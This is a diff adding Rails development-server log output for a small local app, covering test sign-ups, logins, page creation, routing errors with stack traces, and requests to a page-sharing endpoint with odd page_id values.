+  Rendered users/new.html.erb within layouts/application (Duration: 5.4ms | Allocations: 1029)
+Completed 200 OK in 9ms (Views: 7.8ms | ActiveRecord: 0.0ms | Allocations: 1680)
+
+
+Started POST "/users" for ::1 at 2020-09-24 21:51:11 +0800
+Processing by UsersController#create as HTML
+  Parameters: {"authenticity_token"=>"8MlScxxTgShgaxWNrf+mN/H1s+8u1uDDHcTNDvxMbE3o+cWVo55UAhzsvFlACSVR1g+SC2N/TE9HmZaPG9nZrg==", "user"=>{"name"=>"test", "email"=>"test@test.com", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up!"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "test@test.com"], ["LIMIT", 1]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Create (0.2ms)[0m  [1m[32mINSERT INTO "users" ("name", "email", "password_digest", "created_at", "updated_at") VALUES (?, ?, ?, ?, ?)[0m  [["name", "test"], ["email", "test@test.com"], ["password_digest", "$2a$12$TfwYT5mYlGjtp/fzAXgIau6WLJHwmpsDygrXT9OlYWHFPAPXSOKlW"], ["created_at", "2020-09-24 13:51:11.451728"], ["updated_at", "2020-09-24 13:51:11.451728"]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[35m (134.6ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 405ms (ActiveRecord: 135.0ms | Allocations: 5521)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:51:11 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.7ms | Allocations: 1029)
+Completed 200 OK in 5ms (Views: 4.1ms | ActiveRecord: 0.0ms | Allocations: 1694)
+
+
+Started GET "/login" for ::1 at 2020-09-24 21:51:13 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 21.4ms | Allocations: 1046)
+Completed 200 OK in 26ms (Views: 24.8ms | ActiveRecord: 0.0ms | Allocations: 2256)
+
+
+Started POST "/login" for ::1 at 2020-09-24 21:51:18 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"bLg0HvqO6PP8da2ZQ+0W7Mh+v6ucw/xAldIz45/ZrmR3E5Zy4yjZoeJonuq90hK6X8tE6WD2MYhdMXGy20bK/Q==", "login"=>{"email"=>"asd@asd.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "asd@asd.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 3.1ms | Allocations: 465)
+Completed 200 OK in 10ms (Views: 5.5ms | ActiveRecord: 0.4ms | Allocations: 1833)
+
+
+Started GET "/users/new" for ::1 at 2020-09-24 21:51:22 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 4.8ms | Allocations: 1038)
+Completed 200 OK in 9ms (Views: 6.7ms | ActiveRecord: 0.0ms | Allocations: 1690)
+
+
+Started POST "/users" for ::1 at 2020-09-24 21:51:30 +0800
+Processing by UsersController#create as HTML
+  Parameters: {"authenticity_token"=>"ppAWe51EfYNrv04TAFpnnnMHKbEEjuqUdTA6lOuJZv6+oIGdIomoqRc458ftrOT4VP0IVUknRhgvbWEVDBzTHQ==", "user"=>{"name"=>"wow", "email"=>"wow@wow.com", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up!"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "wow@wow.com"], ["LIMIT", 1]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Create (0.8ms)[0m  [1m[32mINSERT INTO "users" ("name", "email", "password_digest", "created_at", "updated_at") VALUES (?, ?, ?, ?, ?)[0m  [["name", "wow"], ["email", "wow@wow.com"], ["password_digest", "$2a$12$JZQqZCxdG91kWF8.pPwzL.nMJ9mwNFgUs6h82uqxam3RQ9LEpqMNa"], ["created_at", "2020-09-24 13:51:30.902891"], ["updated_at", "2020-09-24 13:51:30.902891"]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[35m (85.0ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 364ms (ActiveRecord: 86.0ms | Allocations: 4478)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:51:30 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.0ms | Allocations: 1029)
+Completed 200 OK in 7ms (Views: 5.0ms | ActiveRecord: 0.0ms | Allocations: 1871)
+
+
+Started GET "/login" for ::1 at 2020-09-24 21:51:32 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 2.5ms | Allocations: 454)
+Completed 200 OK in 5ms (Views: 4.2ms | ActiveRecord: 0.0ms | Allocations: 1081)
+
+
+Started POST "/login" for ::1 at 2020-09-24 21:51:36 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"BUCDBcl9HTiLoQPLVWwkd2zrnq0r0tewIcHRi4aQy40e6yFp0NssapW8MLirUyAh+15l79fnGnjpIpPawg+vFA==", "login"=>{"email"=>"wow@wow.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "wow@wow.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 276ms (ActiveRecord: 0.3ms | Allocations: 977)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:51:36 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 1.3ms | Allocations: 1029)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 3ms (Views: 2.5ms | ActiveRecord: 0.1ms | Allocations: 2270)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:52:11 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 4.5ms | Allocations: 1029)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 11ms (Views: 9.1ms | ActiveRecord: 0.3ms | Allocations: 2256)
+
+
+Started GET "/pages/new" for ::1 at 2020-09-24 21:52:16 +0800
+Processing by PagesController#new as HTML
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 1.8ms | Allocations: 1148)
+Completed 200 OK in 12ms (Views: 2.7ms | ActiveRecord: 0.8ms | Allocations: 6814)
+
+
+Started GET "/pages/new" for ::1 at 2020-09-24 21:52:20 +0800
+Processing by PagesController#new as HTML
+Redirected to http://localhost:3000/login
+Filter chain halted as :authorize rendered or redirected
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 248)
+
+
+Started GET "/login" for ::1 at 2020-09-24 21:52:20 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 1.5ms | Allocations: 467)
+Completed 200 OK in 4ms (Views: 2.8ms | ActiveRecord: 0.0ms | Allocations: 1118)
+
+
+Started POST "/login" for ::1 at 2020-09-24 21:52:27 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"+5+n7NDJbVLLtt1FehDFLxDbSEdGowBKIw/Oc+F8SsllPUqiSdg7DFPYpwijGbi9NF8FsUad82nbI4qnCXqpqg==", "login"=>{"email"=>"wow@wow.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "wow@wow.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 279ms (ActiveRecord: 0.4ms | Allocations: 969)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:52:27 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 1.8ms | Allocations: 1038)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 4ms (Views: 3.5ms | ActiveRecord: 0.1ms | Allocations: 2289)
+
+
+Started GET "/pages/new" for ::1 at 2020-09-24 21:52:30 +0800
+Processing by PagesController#new as HTML
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 2.3ms | Allocations: 731)
+Completed 200 OK in 7ms (Views: 3.8ms | ActiveRecord: 0.2ms | Allocations: 1944)
+
+
+Started POST "/pages" for ::1 at 2020-09-24 21:52:34 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"5nBbp25nS4H6igkPHFeM+L36Dk2nGn/K7wwlZbObWH5oIRqlApELTzgPtX4o3NiaMuSER+VSl3wMtHK3K1vlzg==", "page"=>{"title"=>"asdasd", "text"=>"sadasd"}, "commit"=>"Save Page"}
+  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:21:in `create'
+  [1m[36mPage Create (0.3ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "asdasd"], ["text", "sadasd"], ["created_at", "2020-09-24 13:52:34.745697"], ["updated_at", "2020-09-24 13:52:34.745697"]]
+  ↳ app/controllers/pages_controller.rb:21:in `create'
+  [1m[35m (116.9ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:21:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 129ms (ActiveRecord: 117.7ms | Allocations: 4775)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:52:34 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 7.2ms | Allocations: 1029)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 14ms (Views: 11.9ms | ActiveRecord: 0.3ms | Allocations: 2254)
+
+
+Started GET "/pages/1" for ::1 at 2020-09-24 21:52:39 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/pages/1"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/pages?page_id=1" for ::1 at 2020-09-24 21:52:53 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/pages"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/pages/share?page_id=1" for ::1 at 2020-09-24 21:53:05 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 14ms (Views: 0.9ms | ActiveRecord: 0.6ms | Allocations: 2618)
+
+
+Started GET "/pages/share?page_id=1=2" for ::1 at 2020-09-24 21:53:11 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=2"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 4ms (Views: 0.8ms | ActiveRecord: 0.4ms | Allocations: 2434)
+
+
+Started GET "/pages/share?page_id=1-2" for ::1 at 2020-09-24 21:53:35 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1-2"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 6ms (Views: 1.3ms | ActiveRecord: 0.5ms | Allocations: 2435)
+
+
+Started GET "/pages/share?page_id=1=2" for ::1 at 2020-09-24 21:53:53 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=2"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 5ms (Views: 0.8ms | ActiveRecord: 0.5ms | Allocations: 2436)
+
+
+Started GET "/pages/share?page_id=1=2" for ::1 at 2020-09-24 21:54:10 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=2"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 23ms (Views: 1.7ms | ActiveRecord: 2.1ms | Allocations: 12377)
+
+
+Started GET "/pages/share?page_id=sss" for ::1 at 2020-09-24 21:54:13 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"sss"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 0.8ms | ActiveRecord: 0.4ms | Allocations: 1877)
+
+
+Started GET "/pages/share?page_id=2=1" for ::1 at 2020-09-24 21:54:20 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"2=1"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 5ms (Views: 0.9ms | ActiveRecord: 0.4ms | Allocations: 2435)
+
+
+Started GET "/pages/share?page_id=2=2" for ::1 at 2020-09-24 21:54:22 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"2=2"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 9ms (Views: 0.8ms | ActiveRecord: 0.6ms | Allocations: 2438)
+
+
+Started GET "/pages/share?page_id=2=2" for ::1 at 2020-09-24 21:54:52 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"2=2"}
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 1.4ms | Allocations: 183)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 22ms (Views: 11.2ms | ActiveRecord: 1.7ms | Allocations: 13509)
+
+
+Started GET "/pages/share?page_id=2=1" for ::1 at 2020-09-24 21:54:56 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"2=1"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 5ms (Views: 1.6ms | ActiveRecord: 0.4ms | Allocations: 2450)
+
+
+Started GET "/pages/share?page_id=1=2" for ::1 at 2020-09-24 21:54:58 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=2"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 7ms (Views: 2.5ms | ActiveRecord: 0.5ms | Allocations: 2447)
+
+
+Started GET "/pages/share?page_id=1%2d2" for ::1 at 2020-09-24 21:55:06 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1-2"}
